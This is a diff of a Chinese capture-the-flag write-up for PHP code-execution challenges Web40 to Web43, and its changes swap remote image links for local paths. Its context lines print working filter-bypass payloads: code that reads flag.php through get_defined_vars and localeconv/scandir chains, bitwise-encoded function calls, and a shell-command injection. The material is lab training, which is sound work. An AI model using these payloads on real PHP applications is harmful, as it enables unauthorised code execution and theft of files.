@@ -60,7 +60,7 @@ schema_version: "1"
   
 Web40  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsExcTB6EICbYeriab9G0UiaQpWKwnKBI9Dv3qhyJkwxr7vbs1fNWV932pTRVibNYufIlIrYfJKYNPOHZCcCiaQePBFbus4MQmk5icZKU/640?wx_fmt=png "")  
+![](../../.resource/remote/89726a49f4faae57ba02e4205f94c84eb02ac1ef9fecb386ec7db91cb3a19dc5.png "")  
   
 过滤了很多，只有字母，空格，分号，英文括号等能用（注意：正则中过滤的是正文括号）  
   
@@ -70,7 +70,7 @@ get_defined_vars()：PHP 内置函数，返回当前所有已定义变量的数�
   
 执行/?c=print_r(get_defined_vars());可以看到变量，我们可以利用post  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsExmL6qD3nIribChJj1ricX7Efx5TpduNY4dQWkgFtZtcjPIopHNgSGJ2kZCHypvagaqzF2qNdia1LuJKmCuY1SD4lfjLRVSLKB68c/640?wx_fmt=png "")  
+![](../../.resource/remote/569aba325573edfa1f23053507d0d60877768ed06c397a21e20261dec9caed96.png "")  
   
 next()：将数组指针移动到下一个元素并返回其值（这里定位到$_POST数组）；  
   
@@ -86,13 +86,13 @@ POST传参： 1=echo file_get_contents ('flag.php');
   
    
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEzu6g5bg4gJhB1FLgfhhn8gJgDelh2yqMktyQa7VxOZSvkHXIA1Ea2rbc6oe7vl8ibn2tm74t4iaMaxP4V4TIJZgIM09vib4FMv6Q/640?wx_fmt=png "")  
+![](../../.resource/remote/fad87ca7462a219ca01846c7f779f4b54fa0bfe7767849921aa447b681e434e3.png "")  
   
    
   
 查看源码得到flag  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEzEUavVuBRC0hwHticluLE4iaXJcKwk9jz3RtT3WovYsibBibpyGCOa2646FBnId2ah53H9Yia1Mu9ibTOvqjYGAxmicUuRjEsqlQvWa0/640?wx_fmt=png "")  
+![](../../.resource/remote/957582b379c1c038f7acc5ff252e062946645ee5bbb3f4656bc17d0b5d6f23f7.png "")  
   
 其他方法：  
 c=show_source(next(array_reverse(scandir(pos(localeconv())))));  
@@ -102,7 +102,7 @@ c=show_source(next(array_reverse(scandir(pos(localeconv())))));
   
 Web41  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEzecRB5NrNWiafNRHS4hgzvLYKeL8qyGrk2z2XgapU5AvRVVSave5EGPpy6nXCYRpjMMDWUP4ZcfVDBMbhImmavPB36YQG1ydIM/640?wx_fmt=png "")  
+![](../../.resource/remote/ce1104840911b599b79ebdf33256637efcda860a6e54da296f102215d6eebb2a.png "")  
   
    
   
@@ -293,13 +293,13 @@ C= ("%06%09%0c%05%00%07%05%14%00%03%0f%0e%14%05%0e%14%13"|"%60%60%60%60%5f%60%60
   
 C= ("%12%05%01%04%06%09%0c%05"|"%60%60%60%60%60%60%60%60")("%06%0c%01%07%00%10%08%10"|"%60%60%60%60%2e%60%60%60")  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEwCjJmCVd4utx3zbSVNKEKd0JPB8kdYDZVnKuujnWpAVm0jOWWVIJjzCKeN03X9uV9kXkMUjp4YQibtGnwib7GsOqfRice3YiaECic0/640?wx_fmt=png "")  
+![](../../.resource/remote/928363508d6eb540f55ae8fc2474caae5f710eb485a2bc52df75ae09910a6d1f.png "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEypFKkZNC5FPicyCRk0cJFw9UX832I3iaYcG9dlJzH276flibMmzN81W6wMMgp1mibEtpvmTEIz8GRNZXUxQoIKR5bv4q14PKWk6ww/640?wx_fmt=png "")  
+![](../../.resource/remote/db46b339baa9206dd75b7dafa5073e1fd20810c155a787c807c0b12d1ccffd7a.png "")  
   
 Web42  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEyNY5ojRkWF4kHwjqnhVSLX6VciblExYH0oTpr9nvKb6CsPAicf8Zvr568vOx86QlecTtFoiaYBerXJ6j9SFicQ8AXJicxrZXHnrRUU/640?wx_fmt=png "")  
+![](../../.resource/remote/3aa456dd9fdb2024e233dbfffb8101b1fa1cdb7be18ad6cd8fbc44081562e52a.png "")  
   
 这里用了重定向  
   
@@ -320,7 +320,7 @@ Web42
   
 /?c=cat flag.php ||  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEwvOoyAgAJiaWmWfS6dp0JgaDUqSrPWyGXMMTV9WMT2iaOOfibeON5wnvyDTiaauADhwUSd4Qv7daLs0Wrn8vd2piaLKSQ0m0otzOnU/640?wx_fmt=png "")  
+![](../../.resource/remote/db6a929b3d86194a1d885ee52a55e822796d78f1b889ebe0e42d530f6bde5b3d.png "")  
   
 Web43  
   
